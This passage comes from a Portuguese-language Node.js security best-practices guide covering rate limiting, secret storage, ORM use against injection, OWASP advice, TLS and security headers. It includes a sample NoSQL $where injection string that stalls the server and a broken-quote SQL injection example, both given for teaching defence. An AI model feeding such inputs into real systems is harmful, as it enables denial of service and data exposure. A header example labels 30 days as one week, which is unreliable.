    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
      res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">429</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'Too Many Requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Você pode encontrar <a href="https://github.com/animir/node-rate-limiter-flexible/wiki/Overall-example" target="_blank" rel="nofollow noopener noreferrer">mais exemplos na documentação</a>.</p>
<h3>Exemplo de código: Express middleware de limitação de taxa para determinadas rotas</h3>
<p>Usando o pacote do npm <a href="https://www.npmjs.com/package/express-rate-limit" target="_blank" rel="nofollow noopener noreferrer">express-rate-limiter</a></p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">var</span> RateLimit <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-rate-limit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// importante se por trás de um proxy para garantir que o IP do cliente seja passado para req.ip</span>
app<span class="token punctuation">.</span><span class="token function">enable</span><span class="token punctuation">(</span><span class="token string">'trust proxy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 
<span class="token keyword">var</span> apiLimiter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RateLimit</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  windowMs<span class="token operator">:</span> <span class="token number">15</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token comment">// 15 minutes</span>
  max<span class="token operator">:</span> <span class="token number">100</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token comment">// aplicam-se apenas a requests iniciados por /user/</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/user/'</span><span class="token punctuation">,</span> apiLimiter<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>De <a href="https://www.nginx.com/blog/rate-limiting-nginx/" target="_blank" rel="nofollow noopener noreferrer">NGINX blog</a>:</p>
<blockquote>
<p>A limitação de taxa pode ser usada para fins de segurança, por exemplo, para retardar ataques de adivinhação de senha de força bruta. Ele pode ajudar a proteger contra ataques DDoS, limitando a taxa de solicitação de entrada a um valor típico para usuários reais e (com logs) identificar os URLs segmentados. Mais geralmente, ele é usado para proteger servidores de aplicativos upstream de serem sobrecarregados por muitas solicitações do usuário ao mesmo tempo.</p>
</blockquote>
<h2>6.3 Extraia segredos dos config files ou use pacotes para criptografá-los</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A3:Sensitive%20Data%20Exposure%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Nunca armazene segredos em textos simples em arquivos de configuração ou códigos fonte. Em vez disso, use sistemas de gerenciamento secreto como produtos Vault, Kubernetes/Docker Secrets, ou use variáveis de ambiente. Como resultado final, os segredos armazenados no código fonte devem ser criptografados e gerenciados(rolling keys, expiring, auditing, etc). Faça uso de hooks de pre-commit/push para evitar que faça o commit de secredos acidentalmente.</p>
<p><strong>Caso contrário:</strong> O controle de origem, mesmo para repositórios privados, pode ser tornado público por engano, quando todos os segredos são expostos. O acesso ao controle de origem para uma parte externa fornecerá inadvertidamente acesso a sistemas relacionados (bancos de dados, APIs, serviços, etc.).</p>
<h1>Extraia segredos dos config files ou use pacotes para criptografá-los</h1>
<h3>Explicação de um Parágrafo</h3>
<p>A maneira mais comum e segura de fornecer um acesso a aplicações Node.js para chaves e segredos é armazená-los usando variáveis ​​de ambiente no sistema em que ele está sendo executado. Depois de definidos, eles podem ser acessados ​​a partir do objeto global <code class="language-text">process.env</code>.
Um teste decisivo para determinar se um aplicativo tem todas as configurações corretamente consideradas fora do código é se a base de código pode ser de código aberto a qualquer momento, sem comprometer as credenciais.</p>
<p>Para situações raras em que os segredos precisam ser armazenados dentro do controle de origem, usando um pacote como <a href="https://www.npmjs.com/package/cryptr" target="_blank" rel="nofollow noopener noreferrer">cryptr</a> permite que estes sejam armazenados de forma criptografada, ao contrário de texto simples.</p>
<p>Há uma variedade de ferramentas disponíveis que usam o git commit para auditar commits e enviar mensagens para acréscimos acidentais de segredos, como <a href="https://github.com/awslabs/git-secrets" target="_blank" rel="nofollow noopener noreferrer">git-secrets</a>.</p>
<h3>Exemplo de código</h3>
<p>Acessando uma chave de API armazenada em uma variável de ambiente:</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript">    <span class="token keyword">const</span> azure <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'azure'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> apiKey <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">AZURE_STORAGE_KEY</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> blobService <span class="token operator">=</span> azure<span class="token punctuation">.</span><span class="token function">createBlobService</span><span class="token punctuation">(</span>apiKey<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>Usando <code class="language-text">cryptr</code> para armazenar um segredo criptografado:</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> Cryptr <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cryptr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> cryptr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cryptr</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">SECRET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token keyword">let</span> accessToken <span class="token operator">=</span> cryptr<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token string">'e74d7c0de21e72aaffc8f2eef2bdb7c1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// gera saída de string decriptografada que não foi armazenada no controle de origem</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que outros blogueiros dizem</h3>
<blockquote>
<p>As variáveis ​​de env são fáceis de alterar entre as implementações sem alterar nenhum código; Ao contrário dos arquivos de configuração, há pouca chance de eles serem verificados no repositório de código acidentalmente; e, ao contrário dos arquivos de configuração personalizados ou de outros mecanismos de configuração, como as propriedades do sistema Java, eles são um padrão independente de linguagem e sistema operacional.<a href="https://12factor.net/config" target="_blank" rel="nofollow noopener noreferrer">De: The 12 factor app</a></p>
</blockquote>
<h2>6.4. Impeça vulnerabilidades de query injection com bibliotecas ORM/ODM</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Para evitar SQL/NoSQL injection e outros ataques maliciosos, sempre faça uso de um ORM/ODM ou de uma biblioteca de banco de dados que proteja os dados ou suporte consultas parametrizadas nomeadas ou indexadas, e que cuide da validação de entrada do usuário para os tipos esperados. Nunca use apenas template strings do JavaScript ou concatenação de string para injetar valores em queries, pois isto abre sua aplicação para muitas vulnerabilidades. Todas as bibliotecas respeitáveis de acesso a dados do Node.js (por exemplo, <a href="https://github.com/sequelize/sequelize" target="_blank" rel="nofollow noopener noreferrer">Sequelize</a>, <a href="https://github.com/tgriesser/knex" target="_blank" rel="nofollow noopener noreferrer">Knex</a>, <a href="https://github.com/Automattic/mongoose" target="_blank" rel="nofollow noopener noreferrer">mongoose</a>) possuem proteção contra ataques de injeção.</p>
<p><strong>Caso contrário:</strong> A entrada de usuários não validados pode levar à injeção do operador ao trabalhar com MongoDB para NoSQL e não usar um sistema próprio ou ORM irão permitir facilmente um ataque de SQL injection, criando uma grande vulnerabilidade.</p>
<h1>Impeça vulnerabilidades de query injection com bibliotecas ORM/ODM</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Ao criar sua lógica de banco de dados, você deve estar atento a eventuais pontos de injeção que possam ser explorados por possíveis invasores.  Escrever consultas de banco de dados manualmente ou não, incluindo a validação de dados para solicitações do usuário, são os métodos mais fáceis para permitir essas vulnerabilidades. No entanto, é fácil evitar essa situação quando você usa pacotes adequados para validar entradas e manipular operações do banco de dados. Em muitos casos, seu sistema estará são e salvo usando uma biblioteca de validação como
<a href="https://github.com/hapijs/joi" target="_blank" rel="nofollow noopener noreferrer">joi</a> ou <a href="https://github.com/jquense/yup" target="_blank" rel="nofollow noopener noreferrer">yup</a> e uma biblioteca ORM/ODM da lista abaixo. Isso deve garantir o uso de consultas parametrizadas e vinculações de dados para garantir que os dados validados sejam adequadamente ignorados e manipulados sem abrir vetores de ataque indesejados. Muitas dessas bibliotecas facilitarão sua vida como desenvolvedor, ativando muitos recursos úteis, como não ter que escrever consultas complexas manualmente, fornecendo tipos para sistemas de tipos baseados em idioma ou convertendo tipos de dados em formatos desejados. Para concluir, <strong>sempre</strong> valide todos os dados que você irá armazenar e use bibliotecas de mapeamento de dados adequadas para lidar com o trabalho perigoso para você.</p>
<h3>Bibliotecas</h3>
<ul>
<li><a href="https://github.com/typeorm/typeorm" target="_blank" rel="nofollow noopener noreferrer">TypeORM</a></li>
<li><a href="https://github.com/sequelize/sequelize" target="_blank" rel="nofollow noopener noreferrer">sequelize</a></li>
<li><a href="https://github.com/Automattic/mongoose" target="_blank" rel="nofollow noopener noreferrer">mongoose</a></li>
<li><a href="https://github.com/tgriesser/knex" target="_blank" rel="nofollow noopener noreferrer">Knex</a></li>
<li><a href="https://github.com/Vincit/objection.js" target="_blank" rel="nofollow noopener noreferrer">Objection.js</a></li>
<li><a href="https://github.com/balderdashy/waterline" target="_blank" rel="nofollow noopener noreferrer">waterline</a></li>
</ul>
<h3>Exemplo - Injeção de consulta NoSQL</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Uma consulta de</span>
db<span class="token punctuation">.</span>balances<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span> <span class="token punctuation">{</span> active<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token function-variable function">$where</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> obj<span class="token punctuation">.</span>credits <span class="token operator">-</span> obj<span class="token punctuation">.</span>debits <span class="token operator">&lt;</span> userInput<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Onde userInput igual a</span>
<span class="token string">"(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date&lt;10000); return Math.max();})()"</span>

<span class="token comment">// irá desencadear uma negação de serviço</span>

<span class="token comment">// Outra entrada do usuário pode injetar outra lógica, resultando no banco de dados expondo dados sensíveis</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo - Injeção SQL</h3>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">SELECT username, firstname, lastname FROM users WHERE id = &#39;user input&#39;;

SELECT username, firstname, lastname FROM users WHERE id = &#39;evil&#39;input&#39;;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<h3>Recursos adicionais</h3>
<p>🔗 <a href="https://www.owasp.org/index.php/SQL_Injection" target="_blank" rel="nofollow noopener noreferrer">OWASP Injeção SQL</a></p>
<p>🔗 <a href="https://github.com/OWASP/CheatSheetSeries" target="_blank" rel="nofollow noopener noreferrer">OWASP Folha de Dicas de Prevenção de Injeção SQL</a></p>
<p>🔗 <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="nofollow noopener noreferrer">Teste para Injeções NoSQL</a></p>
<h3>O que outros Blogueiros dizem</h3>
<p>Riscos de injeção NoSQL da <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="nofollow noopener noreferrer">OWASP wiki</a></p>
<blockquote>
<p>Ataques de injeção NoSQL podem ser executados em áreas diferentes do que uma injeção SQL tradicional em uma aplicação. Onde a injeção SQL seria executada no mecanismo do banco de dados, as variantes do NoSQL podem ser executadas na camada da aplicação ou na camada do banco de dados, dependendo da API NoSQL usada e do modelo de dados. Normalmente, os ataques de injeção NoSQL executarão onde a sequência de ataque é analisada, avaliada ou concatenada em uma chamada de API NoSQL.</p>
</blockquote>
<h2>6.5. Coleção genérica de boas práticas de segurança</h2>
<p><strong>TL;DR:</strong> Esta é uma coleção de conselhos de segurança que não estão relacionadas diretamente com Node.js - a implementação do Node não é muito diferente comparado a outras linguagens. Clique em “leia mais” para dar uma olhada.</p>
<h1>Coleção genérica de boas práticas de segurança</h1>
<p>A seção de boas práticas comuns de segurança contém as práticas recomendadas que são padronizadas em muitos frameworks e convenções. Por exemplo, a execução de um aplicativo com SSL/TLS deve ser uma diretriz e uma convenção comuns em todas as configurações para obter grandes benefícios de segurança.</p>
<h2>Use SSL/TLS para criptografar a conexão cliente-servidor</h2>
<p><strong>TL;DR:</strong> Nos tempode de <a href="https://letsencrypt.org/" target="_blank" rel="nofollow noopener noreferrer">certificados SSL/TLS gratuitos</a> e fácil configuração desses, você não precisa mais pesar vantagens e desvantagens de usar um servidor seguro porque as vantagens como segurança, suporte à tecnologia moderna e confiança superam claramente as desvantagens, como sobrecarga mínima em comparação com o HTTP puro.</p>
<p><strong>Caso contrário:</strong> invasores podem executar ataques man-in-the-middle, espionar o comportamento de seus usuários e executar ações ainda mais maliciosas quando a conexão não é criptografada.</p>
<h1>Usando HTTPS para criptografar a conexão cliente-servidor</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Usar serviços como <a href="https://letsencrypt.org/" target="_blank" rel="nofollow noopener noreferrer">Let’sEncrypt</a>, uma autoridade certificadora que fornece certificados SSL/TLS <strong>gratuitos</strong>, pode ajudar a criptografar a comunicação de suas aplicações. Frameworks Node.js como <a href="http://expressjs.com/" target="_blank" rel="nofollow noopener noreferrer">Express</a> (baseado no módulo central <code class="language-text">https</code>) suportam SSL/TLS, o qual pode ser implementado em poucas linhas de código.</p>
<p>Você também pode configurar SSL/TLS em um proxy reverso, como <a href="http://nginx.org/en/docs/http/configuring_https_servers.html" target="_blank" rel="nofollow noopener noreferrer">NGINX</a> ou HAProxy.</p>
<h3>Exemplo de código - Ativando SSL/TLS usando o framework Express</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> https <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment">// O caminho deve ser alterado de acordo com sua configuração</span>
    cert<span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./sslcert/fullchain.pem'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    key<span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./sslcert/privkey.pem'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
https<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">443</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>Comparando valores secretos e hashes com segurança</h2>
<p><strong>TL;DR:</strong> Ao comparar valores secretos ou hashes como digestões do HMAC, você deve usar a função  <a href="https://nodejs.org/dist/latest-v9.x/docs/api/crypto.html#crypto_crypto_timingsafeequal_a_b" target="_blank" rel="nofollow noopener noreferrer"><code class="language-text">crypto.timingSafeEqual(a, b)</code></a> que o Node fornece por padrão desde o Node.js v6.6.0. Este método compara dois objetos e continua comparando, mesmo que os dados não correspondam. Os métodos de comparação de igualdade padrão simplesmente retornariam após uma incompatibilidade de caracteres, permitindo ataques de tempo com base no comprimento da operação.</p>
<p><strong>Caso contrário:</strong> Usando operadores de comparação de igualdade padrão, você pode expor informações críticas com base no tempo gasto para comparar dois objetos.</p>
<h2>Gerando strings aleatórias usando Node.js</h2>
<p><strong>TL;DR:</strong> Usar uma função personalizada que gera sequências pseudo-aleatórias para tokens e outros casos de uso sensíveis à segurança pode não ser tão aleatório quanto você pensa, tornando seu aplicativo vulnerável a ataques criptográficos. Quando você precisar gerar strings aleatórias seguras, use a função <a href="https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback" target="_blank" rel="nofollow noopener noreferrer"><code class="language-text">crypto.randomBytes(size, [callback])</code></a> usando a entropia disponível fornecida pelo sistema.</p>
<p><strong>Caso contrário:</strong> Ao gerar strings pseudo-aleatórias sem métodos criptograficamente seguros, os invasores podem prever e reproduzir os resultados gerados, tornando seu aplicativo inseguro.</p>
<p>Em seguida, abaixo, listamos alguns conselhos importantes do projeto OWASP.</p>
<h2>OWASP A2: Autenticação Quebrada</h2>
<ul>
<li>Requisite MFA/2FA (autenticação de múltiplos fatores) para serviços e contas importantes</li>
<li>Troque senhas e chaves de acesso com freqüência, incluindo chaves SSH</li>
<li>Aplique diretivas de senha forte, tanto para operadores quanto para gerenciamento de usuários no aplicativo (<a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet#Implement_Proper_Password_Strength_Controls.22" target="_blank" rel="nofollow noopener noreferrer">🔗 OWASP recomendações para senhas</a>)</li>
<li>Não envie ou implemente sua aplicação com nenhuma credencial padrão, principalmente para usuários administradores ou serviços externos dos quais você depende</li>
<li>Use apenas métodos de autenticação padrão, como OAuth, OpenID, etc. - <strong>evite</strong> autenticação básica</li>
<li>Limitação da taxa de autenticação: Não permitir mais de <em>X</em> tentativas de login (incluindo recuperação de senha, etc.) em um período <em>Y</em></li>
<li>Na falha de login, não deixe o usuário saber se a verificação de nome de usuário ou senha falhou, apenas retorne um erro de autenticação comum</li>
<li>Considere o uso de um sistema centralizado de gerenciamento de usuários para evitar o gerenciamento de várias contas por funcionário (por exemplo, GitHub, AWS, Jenkins, etc) e para se beneficiar de um sistema de gerenciamento de usuários testado em batalha.</li>
</ul>
<h2>OWASP A5:  Controle de acesso quebrado</h2>
<ul>
<li>Respeite o <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" target="_blank" rel="nofollow noopener noreferrer">princípio do menor privilégio</a>  -  cada componente e DevOps deve ter acesso apenas às informações e recursos necessários</li>
<li><strong>Nunca</strong> trabalhar com a conta console/root (privilégio completo), exceto para gerenciamento de contas</li>
<li>Executar todas as instâncias/contêineres com uma conta de função/serviço</li>
<li>Atribuir permissões a grupos e não a usuários. Isso deve tornar o gerenciamento de permissões mais fácil e transparente para a maioria dos casos</li>
</ul>
<h2>OWASP A6: Configurações de Segurança</h2>
<ul>
<li>O acesso ao interior do ambiente de produção é feito somente através da rede interna, use SSH ou outras formas, mas <em>nunca</em> exponha serviços internos</li>
<li>Restringir o acesso à rede interna - defina explicitamente qual recurso pode acessar outros recursos (por exemplo, política de rede ou sub-redes)</li>
<li>Se estiver usando cookies, configure-o para o modo “seguro”, no qual ele está sendo enviado apenas por SSL</li>
<li>Se estiver usando cookies, configure-o apenas para “mesmo site”, para que apenas solicitações do mesmo domínio recebam os cookies designados</li>
<li>Se estiver usando cookies, prefira a configuração “HttpOnly” que impede que o código JavaScript do lado do cliente acesse os cookies</li>
<li>Proteja cada VPC com regras de acesso restritas e restritivas</li>
<li>Priorize ameaças usando qualquer modelagem padrão de ameaça à segurança como STRIDE ou DREAD</li>
<li>Protege contra ataques DDoS usando balanceadores de carga HTTP(S) e TCP</li>
<li>Realize testes periódicos de penetração por agências especializadas</li>
</ul>
<h2>OWASP A3: Exposição de dados sensíveis</h2>
<ul>
<li>Aceite apenas conexões SSL/TLS, imponha Strict-Transport-Security usando cabeçalhos</li>
<li>Separe a rede em segmentos (ou seja, sub-redes) e garanta que cada nó tenha o mínimo necessário de permissões de acesso de rede</li>
<li>Agrupar todos os serviços/instâncias que não precisam de acesso à Internet e explicitamente desautorizar qualquer conexão de saída (também uma sub-rede privada)</li>
<li>Armazene todos os segredos em serviços de cofre, como o AWS KMS, o HashiCorp Vault ou o Google Cloud KMS</li>
<li>Bloqueie instâncias de metadados confidenciais usando metadados</li>
<li>Criptografe dados em trânsito quando deixa um limite físico</li>
<li>Não inclua segredos em instruções de log</li>
<li>Evite mostrar senhas simples no frontend, tome as medidas necessárias no backend e nunca armazene informações confidenciais em texto simples</li>
</ul>
<h2>OWASP A9: Usando componentes com vulnerabilidades de segurança conhecidas</h2>
<ul>
<li>Digitalize imagens do docker para vulnerabilidades conhecidas (usando o Docker e outros fornecedores oferecem serviços de digitalização)</li>
<li>Ativar atualizações e patches automáticos de instâncias (máquinas) para evitar a execução de versões antigas do sistema operacional que não possuem patches de segurança</li>
<li>Forneça ao usuário os tokens ‘id’, ‘access’ e ‘refresh’ para que o token de acesso seja de curta duração e renovado com o token de atualização</li>
<li>Registrar e auditar cada chamada de API para serviços de nuvem e gerenciamento (por exemplo, quem excluiu o bucket do S3?) Usando serviços como o AWS CloudTrail</li>
<li>Execute o verificador de segurança do seu provedor de nuvem (por exemplo, consultor de confiança de segurança da AWS)</li>
</ul>
<h2>OWASP A10: Registro e monitoramento insuficientes</h2>
<ul>
<li>Alerte em eventos de auditoria notáveis ​​ou suspeitos, como login de usuário, criação de novo usuário, alteração de permissão, etc.</li>
<li>Alerte sobre quantidade irregular de falhas de login (ou ações equivalentes como senha esquecida)</li>
<li>Inclua o horário e o nome de usuário que iniciaram a atualização em cada registro de banco de dados</li>
</ul>
<h2>OWASP A7: Cross-Site-Scripting (XSS)</h2>
<ul>
<li>Use mecanismos de template ou frameworks que escapem automaticamente do XSS por design, como EJS, Pug, React ou Angular. Aprenda as limitações de cada mecanismo de proteção XSS e lidar adequadamente com os casos de uso que não são cobertos</li>
<li>O escape de dados de solicitação HTTP não confiáveis ​​com base no contexto na saída HTML (corpo, atributo, JavaScript, CSS ou URL) resolverá as vulnerabilidades de XSS refletido e armazenado</li>
<li>Aplicar codificação sensível ao contexto quando modificar o documento do navegador no lado do cliente atua em relação ao DOM XSS</li>
<li>Ativar uma Política de Segurança de Conteúdo (CSP) como um controle de mitigação de defesa em profundidade contra o XSS</li>
</ul>
<h2>6.6. Ajuste os headers de resposta HTTP para uma segurança aprimorada</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A6:Security%20Misconfiguration%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Sua aplicação deve estar utilizando headers seguros para evitar que invasores façam ataques comuns, como scripts entre sites (XSS), clickjacking, dentre outros ataques maliciosos. Eles podem ser configurados facilmente usando módulos como o <a href="https://www.npmjs.com/package/helmet" target="_blank" rel="nofollow noopener noreferrer">helmet</a>.</p>
<p><strong>Caso contrário:</strong> Invasores podem realizar ataques diretos aos usuários de sua aplicação, levando a grandes vulnerabilidades de segurança.</p>
<h1>Ajuste os headers de resposta HTTP para uma segurança aprimorada</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Existem cabeçalhos relacionados à segurança usados ​​para proteger ainda mais seu aplicativo. Os cabeçalhos mais importantes estão listados abaixo. Você também pode visitar os sites vinculados na parte inferior desta página para obter mais informações sobre esse tópico. Você pode facilmente definir esses cabeçalhos usando o módulo <a href="https://www.npmjs.com/package/helmet" target="_blank" rel="nofollow noopener noreferrer">Helmet</a> para express (<a href="https://www.npmjs.com/package/koa-helmet" target="_blank" rel="nofollow noopener noreferrer">Helmet para koa</a>).</p>
<h3>Índice</h3>
<ul>
<li><a href="#seguran%C3%A7a-de-transporte-restrita-http-hsts">Segurança de Transporte Restrita HTTP (HSTS)</a></li>
<li><a href="#pino-de-chave-p%C3%BAblica-para-http-hpkp">Pino de Chave Pública para HTTP (HPKP)</a></li>
<li><a href="#x-frame-options">X-Frame-Options</a></li>
<li><a href="#x-xss-protection">X-XSS-Protection</a></li>
<li><a href="#x-content-type-options">X-Content-Type-Options</a></li>
<li><a href="#referrer-policy">Referrer-Policy</a></li>
<li><a href="#expect-ct">Expect-CT</a></li>
<li><a href="#content-security-policy">Content-Security-Policy</a></li>
<li><a href="#recursos-adicionais">Recursos Adicionais</a></li>
</ul>
<h3>Segurança de Transporte Restrita HTTP (HSTS)</h3>
<p>Segurança de Transporte Restrita HTTP (HSTS) é um mecanismo de política de segurança da Web para proteger sites contra <a href="https://en.wikipedia.org/wiki/Downgrade_attack" target="_blank" rel="nofollow noopener noreferrer">ataques de downgrade de protocolo</a> e <a href="https://www.owasp.org/index.php/Session_hijacking_attack" target="_blank" rel="nofollow noopener noreferrer">sequestro de cookie</a>. Ele permite que os servidores da Web declarem que os navegadores da Web (ou outros agentes de usuários compatíveis) só devem interagir com ele usando <strong>conexões HTTPS seguras</strong> e <strong>nunca</strong> através do protocolo HTTP inseguro. A política de HSTS é implementada usando o cabeçalho <code class="language-text">Strict-Transport-Security</code> sobre uma conexão HTTPS existente.</p>
<p>O cabeçalho Strict-Transport-Security aceita um valor <code class="language-text">max-age</code> em segundos, para notificar o navegador quanto tempo deve acessar o site usando somente HTTPS, e um valor<code class="language-text">includeSubDomains</code> para aplicar a regra Strict Transport Security a todos os subdomínios do site.</p>
<p>Exemplo de cabeçalho - Diretiva HSTS habilitada por uma semana, inclui subdomínios</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">Strict-Transport-Security: max-age=2592000; includeSubDomains</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#hsts" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security" target="_blank" rel="nofollow noopener noreferrer">Leia na documentação web da MDN</a></p>
<h3>Pino de Chave Pública para HTTP (HPKP)</h3>
<p>Pino de Chave Pública para HTTP (HPKP) é um mecanismo de segurança que permite que os sites HTTPS resistam à falsificação de identidade por invasores usando certificados SSL/TLS mal-emitidos ou fraudulentos.</p>
